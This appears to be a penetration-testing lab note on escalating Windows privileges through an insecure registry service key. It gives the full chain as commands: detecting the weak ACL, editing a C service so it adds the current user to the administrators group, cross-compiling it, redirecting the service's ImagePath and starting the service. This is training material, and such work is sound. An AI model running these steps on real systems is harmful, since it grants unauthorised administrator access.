 **Detection**

Open PowerShell prompt and type: 

```batch - windows
powershell -ep bypass
```

```powershell - windows
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl  
```

Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

```
.\winPEASx64.exe servicesinfo
```

**Exploitation**

Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.

Open windows_service.c in a text editor and replace the command used by the system() function to (line 15): 

[[windows_service.c]]

```mousepad - kali
cmd.exe /k net localgroup administrators %username% /add
```

Exit the text editor and compile the file by typing the following in the command prompt: 

```bash - kali
x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
```

(NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')

Copy the generated file x.exe, to the Windows VM.

[[4._File Transfers]]

Place x.exe in ‘C:\Temp’.  

Open command prompt at type: 

```batch - kali
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f  
```

In the command prompt type: 

```batch - kali
sc start regsvc
```

```batch - kali
sc start regsvc
```

[[___.Misc Commands#Restart host]]

It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 

```batch - windows
net localgroup administrators
```

